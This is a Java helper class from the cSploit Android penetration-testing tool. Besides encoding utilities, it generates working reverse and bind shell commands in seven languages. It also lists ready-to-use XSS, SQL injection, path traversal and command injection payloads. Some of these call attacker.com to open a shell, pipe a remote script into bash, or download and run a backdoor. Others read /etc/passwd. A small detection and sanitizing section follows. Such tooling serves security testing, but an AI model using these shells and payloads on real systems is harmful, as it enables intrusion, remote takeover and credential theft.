/*
 * This file is part of cSploit.
 *
 * cSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * cSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with cSploit. If not, see <http://www.gnu.org/licenses/>.
 */

package org.csploit.android.helpers;

import android.util.Base64;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * PayloadHelper - Security payload generation and encoding utilities.
 * 
 * Provides:
 * - Payload encoding/decoding (Base64, URL, Hex)
 * - Common payload templates
 * - Payload obfuscation
 * - Payload validation
 * 
 * Usage:
 * {@code
 * // Encode payload
 * String encoded = PayloadHelper.base64Encode("test payload");
 * 
 * // Generate reverse shell command
 * String shell = PayloadHelper.generateReverseShell("192.168.1.1", 4444, ShellType.BASH);
 * }
 */
public final class PayloadHelper {
    
    private static final String TAG = "PayloadHelper";
    
    /**
     * Shell types for reverse shells.
     */
    public enum ShellType {
        BASH,
        PYTHON,
        PERL,
        RUBY,
        PHP,
        NETCAT,
        POWERSHELL
    }
    
    /**
     * Encoding types.
     */
    public enum EncodingType {
        BASE64,
        URL,
        HEX,
        HTML,
        UNICODE
    }
    
    private PayloadHelper() {}
    
    // ==================== Encoding Methods ====================
    
    /**
     * Base64 encode a string.
     */
    @NonNull
    public static String base64Encode(@NonNull String input) {
        return Base64.encodeToString(input.getBytes(StandardCharsets.UTF_8), Base64.NO_WRAP);
    }
    
    /**
     * Base64 decode a string.
     */
    @Nullable
    public static String base64Decode(@NonNull String input) {
        try {
            byte[] decoded = Base64.decode(input, Base64.DEFAULT);
            return new String(decoded, StandardCharsets.UTF_8);
        } catch (IllegalArgumentException e) {
            Log.w(TAG, "Invalid Base64 string", e);
            return null;
        }
    }
    
    /**
     * URL encode a string.
     */
    @NonNull
    public static String urlEncode(@NonNull String input) {
        try {
            return java.net.URLEncoder.encode(input, "UTF-8");
        } catch (Exception e) {
            return input;
        }
    }
    
    /**
     * URL decode a string.
     */
    @NonNull
    public static String urlDecode(@NonNull String input) {
        try {
            return java.net.URLDecoder.decode(input, "UTF-8");
        } catch (Exception e) {
            return input;
        }
    }
    
    /**
     * Hex encode a string.
     */
    @NonNull
    public static String hexEncode(@NonNull String input) {
        StringBuilder hex = new StringBuilder();
        for (byte b : input.getBytes(StandardCharsets.UTF_8)) {
            hex.append(String.format("%02x", b));
        }
        return hex.toString();
    }
    
    /**
     * Hex decode a string.
     */
    @Nullable
    public static String hexDecode(@NonNull String input) {
        try {
            int len = input.length();
            byte[] data = new byte[len / 2];
            for (int i = 0; i < len; i += 2) {
                data[i / 2] = (byte) ((Character.digit(input.charAt(i), 16) << 4)
                        + Character.digit(input.charAt(i + 1), 16));
            }
            return new String(data, StandardCharsets.UTF_8);
        } catch (Exception e) {
            Log.w(TAG, "Invalid hex string", e);
            return null;
        }
    }
    
    /**
     * HTML encode special characters.
     */
    @NonNull
    public static String htmlEncode(@NonNull String input) {
        return input
                .replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#x27;");
    }
    
    /**
     * Unicode encode a string (\\uXXXX format).
     */
    @NonNull
    public static String unicodeEncode(@NonNull String input) {
        StringBuilder sb = new StringBuilder();
        for (char c : input.toCharArray()) {
            sb.append(String.format("\\u%04x", (int) c));
        }
        return sb.toString();
    }
    
    /**
     * Apply multiple encodings.
     */
    @NonNull
    public static String multiEncode(@NonNull String input, @NonNull EncodingType... encodings) {
        String result = input;
        for (EncodingType encoding : encodings) {
            switch (encoding) {
                case BASE64:
                    result = base64Encode(result);
                    break;
                case URL:
                    result = urlEncode(result);
                    break;
                case HEX:
                    result = hexEncode(result);
                    break;
                case HTML:
                    result = htmlEncode(result);
                    break;
                case UNICODE:
                    result = unicodeEncode(result);
                    break;
            }
        }
        return result;
    }
    
    // ==================== Reverse Shell Generators ====================
    
    /**
     * Generate reverse shell command.
     */
    @NonNull
    public static String generateReverseShell(@NonNull String host, int port, @NonNull ShellType type) {
        switch (type) {
            case BASH:
                return String.format("bash -i >& /dev/tcp/%s/%d 0>&1", host, port);
                
            case PYTHON:
                return String.format(
                        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                        host, port);
                
            case PERL:
                return String.format(
                        "perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                        host, port);
                
            case RUBY:
                return String.format(
                        "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'",
                        host, port);
                
            case PHP:
                return String.format(
                        "php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                        host, port);
                
            case NETCAT:
                return String.format("nc -e /bin/sh %s %d", host, port);
                
            case POWERSHELL:
                return String.format(
                        "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
                        host, port);
                
            default:
                return String.format("bash -i >& /dev/tcp/%s/%d 0>&1", host, port);
        }
    }
    
    /**
     * Generate bind shell command.
     */
    @NonNull
    public static String generateBindShell(int port, @NonNull ShellType type) {
        switch (type) {
            case BASH:
                return String.format("bash -i >& /dev/tcp/0.0.0.0/%d 0>&1", port);
                
            case PYTHON:
                return String.format(
                        "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",%d));s.listen(1);c,a=s.accept();subprocess.call([\"/bin/sh\",\"-i\"],stdin=c.fileno(),stdout=c.fileno(),stderr=c.fileno())'",
                        port);
                
            case NETCAT:
                return String.format("nc -lvp %d -e /bin/sh", port);
                
            default:
                return String.format("nc -lvp %d -e /bin/sh", port);
        }
    }
    
    // ==================== Common Payloads ====================
    
    /**
     * XSS payload templates.
     */
    @NonNull
    public static List<String> getXssPayloads() {
        List<String> payloads = new ArrayList<>();
        payloads.add("<script>alert('XSS')</script>");
        payloads.add("<img src=x onerror=alert('XSS')>");
        payloads.add("<svg onload=alert('XSS')>");
        payloads.add("<body onload=alert('XSS')>");
        payloads.add("javascript:alert('XSS')");
        payloads.add("<img src=\"javascript:alert('XSS')\">");
        payloads.add("'\"><script>alert('XSS')</script>");
        payloads.add("<iframe src=\"javascript:alert('XSS')\">");
        payloads.add("<input onfocus=alert('XSS') autofocus>");
        payloads.add("<marquee onstart=alert('XSS')>");
        return payloads;
    }
    
    /**
     * SQL injection payload templates.
     */
    @NonNull
    public static List<String> getSqliPayloads() {
        List<String> payloads = new ArrayList<>();
        payloads.add("' OR '1'='1");
        payloads.add("' OR '1'='1' --");
        payloads.add("\" OR \"1\"=\"1");
        payloads.add("1; DROP TABLE users --");
        payloads.add("' UNION SELECT NULL --");
        payloads.add("' UNION SELECT username, password FROM users --");
        payloads.add("admin' --");
        payloads.add("' OR 1=1#");
        payloads.add("') OR ('1'='1");
        payloads.add("1 AND 1=1");
        return payloads;
    }
    
    /**
     * Command injection payload templates.
     */
    @NonNull
    public static List<String> getCmdInjectionPayloads() {
        List<String> payloads = new ArrayList<>();
        payloads.add("; ls -la");
        payloads.add("| cat /etc/passwd");
        payloads.add("& whoami");
        payloads.add("`id`");
        payloads.add("$(cat /etc/passwd)");
        payloads.add("; nc -e /bin/sh attacker.com 4444");
        payloads.add("| curl attacker.com/shell.sh | bash");
        payloads.add("&& wget attacker.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor");
        return payloads;
    }
    
    /**
     * Path traversal payload templates.
     */
    @NonNull
    public static List<String> getPathTraversalPayloads() {
        List<String> payloads = new ArrayList<>();
        payloads.add("../../../etc/passwd");
        payloads.add("....//....//....//etc/passwd");
        payloads.add("..%2F..%2F..%2Fetc%2Fpasswd");
        payloads.add("..%252F..%252F..%252Fetc%252Fpasswd");
        payloads.add("/etc/passwd%00");
        payloads.add("....\\\\....\\\\....\\\\windows\\\\system.ini");
        payloads.add("..\\..\\..\\windows\\win.ini");
        return payloads;
    }
    
    // ==================== Payload Analysis ====================
    
    /**
     * Detect encoding type of a string.
     */
    @Nullable
    public static EncodingType detectEncoding(@NonNull String input) {
        // Check for Base64
        if (input.matches("^[A-Za-z0-9+/]+=*$") && input.length() % 4 == 0) {
            try {
                Base64.decode(input, Base64.DEFAULT);
                return EncodingType.BASE64;
            } catch (Exception ignored) {}
        }
        
        // Check for URL encoding
        if (input.contains("%") && input.matches(".*%[0-9A-Fa-f]{2}.*")) {
            return EncodingType.URL;
        }
        
        // Check for Hex
        if (input.matches("^[0-9A-Fa-f]+$") && input.length() % 2 == 0) {
            return EncodingType.HEX;
        }
        
        // Check for HTML entities
        if (input.contains("&") && input.matches(".*&(amp|lt|gt|quot|#x?[0-9a-fA-F]+);.*")) {
            return EncodingType.HTML;
        }
        
        // Check for Unicode
        if (input.matches(".*\\\\u[0-9A-Fa-f]{4}.*")) {
            return EncodingType.UNICODE;
        }
        
        return null;
    }
    
    /**
     * Check if string contains potential malicious patterns.
     */
    @NonNull
    public static Map<String, Boolean> detectMaliciousPatterns(@NonNull String input) {
        Map<String, Boolean> results = new HashMap<>();
        
        String lower = input.toLowerCase();
        
        // XSS patterns
        results.put("xss_script", lower.contains("<script") || lower.contains("javascript:"));
        results.put("xss_event", lower.matches(".*on(load|error|click|mouseover|focus)\\s*=.*"));
        
        // SQL injection patterns
        results.put("sqli_union", lower.contains("union") && lower.contains("select"));
        results.put("sqli_or", lower.matches(".*['\"]\\s*or\\s*['\"]?\\d+['\"]?\\s*=\\s*['\"]?\\d+.*"));
        results.put("sqli_comment", lower.contains("--") || lower.contains("/*"));
        
        // Command injection
        results.put("cmd_pipe", input.contains("|") || input.contains(";") || input.contains("&"));
        results.put("cmd_backtick", input.contains("`") || input.contains("$("));
        
        // Path traversal
        results.put("path_traversal", input.contains("..") || input.contains("%2e%2e"));
        
        return results;
    }
    
    /**
     * Sanitize input to prevent injection.
     */
    @NonNull
    public static String sanitize(@NonNull String input) {
        // Remove null bytes
        String sanitized = input.replace("\0", "");
        
        // Escape special characters
        sanitized = sanitized
                .replace("'", "\\'")
                .replace("\"", "\\\"")
                .replace(";", "\\;")
                .replace("|", "\\|")
                .replace("&", "\\&")
                .replace("`", "\\`")
                .replace("$", "\\$");
        
        return sanitized;
    }
}
